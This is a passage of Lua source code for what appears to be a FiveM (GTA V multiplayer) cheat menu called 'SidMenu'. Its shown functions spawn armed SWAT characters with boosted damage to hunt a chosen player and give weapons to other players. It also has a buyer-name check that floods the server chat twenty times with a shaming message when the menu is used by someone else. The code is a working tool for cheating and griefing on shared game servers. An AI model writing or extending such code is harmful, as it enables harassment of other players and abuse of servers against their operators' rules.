                            RequestModel('s_m_y_swat_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('s_m_y_swat_01') then
                                Citizen.Wait(50)
                                local ped = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local ped1 =
                                    CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v, 0)
                                    TaskDriveBy(
                                        ped,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        pos.x,
                                        pos.y,
                                        pos.z,
                                        200,
                                        99,
                                        0,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    TaskShootAtEntity(
                                        ped1,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        200,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    makePedHostile(ped, SelectedPlayer, 0, 0)
                                    makePedHostile(ped1, SelectedPlayer, 0, 0)
                                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                                    TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                                    SetPlayerWeaponDamageModifier(ped, 500)
                                    SetPlayerWeaponDamageModifier(ped1, 500)
                                    for i = 1, 2 do
                                        Citizen.Wait(5)
                                    ClearPedTasks(GetPlayerPed(-1))
                                    end
                                end
                            end
                        end
                    end
                end
					end
				
			
				

				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("SingleWepPlayer") then
				for i = 1, #allWeapons do
					if SidMenu.Button(allWeapons[i]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
					end
				end
			
				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("Cred") then
				if SidMenu.Button('Sid#7841') then
				elseif SidMenu.CheckBox("~p~Discord ~w~Rich Presence", RichEnable, function(enabled) RichEnable = enabled end) then
				end

				SidMenu.Display()
			elseif IsDisabledControlPressed(0, 11) then
			local urname = GetPlayerName(PlayerId())
				if urname ~= buyerserial then
					drawNotification("~r~This file isn't meant for you")
					a=1 repeat TriggerServerEvent("_chat:messageEntered", '^1Bombay',{0,255,255}, '  ^8I am trying to cheat but my Menu doesn´t open because I stole it') a=a+1 until (a>20)
				else
					drawNotification("~g~Authenticated")
					SidMenu.OpenMenu("MainMenu")
				end
			end

			Citizen.Wait(0)
		end
	end
)

print 'Made by Sid#7841'

RegisterCommand("killmenu", function(source,args,raw)
	Enabled = false
end, false)
